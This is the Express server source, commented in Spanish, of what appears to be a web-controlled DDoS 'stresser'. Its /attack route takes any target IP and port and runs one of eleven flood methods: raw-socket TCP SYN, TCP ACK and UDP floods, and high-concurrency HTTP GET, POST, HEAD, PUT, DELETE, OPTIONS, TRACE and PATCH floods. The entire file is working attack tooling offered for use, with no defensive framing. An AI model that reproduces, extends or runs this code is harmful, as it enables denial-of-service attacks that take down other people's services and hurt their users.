const express = require('express');
const axios = require('axios');
const raw = require('raw-socket');
const path = require('path');
const { Worker } = require('worker_threads');

const app = express();
const PORT = 3000;

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const MAX_CONCURRENT_REQUESTS = 500; // Máximo de solicitudes concurrentes

const attackMethods = {
    // Métodos de Capa 4
    tcpSynFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendPackets = () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
                socket.on('error', (error) => console.error(`Error: ${error.message}`));
                socket.send(Buffer.from([0x00]), ip, port);
                iterations++;
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(new Promise((resolve) => {
                    sendPackets();
                    resolve();
                }));
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    udpFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendPackets = () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                const socket = raw.createSocket({ protocol: raw.Protocol.UDP });
                socket.send(Buffer.from('Flood'), ip, port);
                iterations++;
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(new Promise((resolve) => {
                    sendPackets();
                    resolve();
                }));
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    tcpAckFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendPackets = () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
                socket.send(Buffer.from([0x01]), ip, port); // Enviar un paquete ACK
                iterations++;
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(new Promise((resolve) => {
                    sendPackets();
                    resolve();
                }));
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    // Métodos de Capa 7
    httpGetFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.get(`http://${ip}:${port}`);
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpPostFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.post(`http://${ip}:${port}`, { data: 'test' });
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpHeadFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.head(`http://${ip}:${port}`);
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpPutFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.put(`http://${ip}:${port}`, { data: 'test' });
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpDeleteFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.delete(`http://${ip}:${port}`);
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

        httpOptionsFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.options(`http://${ip}:${port}`);
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpTraceFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.request({
                        method: 'TRACE',
                        url: `http://${ip}:${port}`,
                    });
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },

    httpPatchFlood: async (ip, port, duration, requestsPerSecond) => {
        const endTime = Date.now() + duration * 1000;
        let iterations = 0;

        const sendRequests = async () => {
            for (let i = 0; i < requestsPerSecond; i++) {
                try {
                    await axios.patch(`http://${ip}:${port}`, { data: 'test' });
                    iterations++;
                } catch (error) {
                    console.error(`Error: ${error.message}`);
                }
            }
        };

        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                promises.push(sendRequests());
            }
            await Promise.all(promises);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo
        }

        return iterations;
    },
};

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Ruta para iniciar el ataque
app.post('/attack', async (req, res) => {
    const { ip, port, duration, requestsPerSecond, method } = req.body;

    let iterations = 0;
    try {
        if (method === 'TCP SYN Flood') {
            iterations = await attackMethods.tcpSynFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'UDP Flood') {
            iterations = await attackMethods.udpFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'TCP ACK Flood') {
            iterations = await attackMethods.tcpAckFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP GET Flood') {
            iterations = await attackMethods.httpGetFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP POST Flood') {
            iterations = await attackMethods.httpPostFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP HEAD Flood') {
            iterations = await attackMethods.httpHeadFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP PUT Flood') {
            iterations = await attackMethods.httpPutFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP DELETE Flood') {
            iterations = await attackMethods.httpDeleteFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP OPTIONS Flood') {
            iterations = await attackMethods.httpOptionsFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP TRACE Flood') {
            iterations = await attackMethods.httpTraceFlood(ip, port, duration, requestsPerSecond);
        } else if (method === 'HTTP PATCH Flood') {
            iterations = await attackMethods.httpPatchFlood(ip, port, duration, requestsPerSecond);
        } else {
            return res.status(400).json({ message: 'Método no válido' });
        }

        res.json({ message: `Ataque completado: ${iterations} solicitudes enviadas a ${ip}:${port}` });
    } catch (error) {
        console.error(`Error durante el ataque: ${error.message}`);
        res.status(500).json({ message: 'Error durante el ataque' });
    }
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
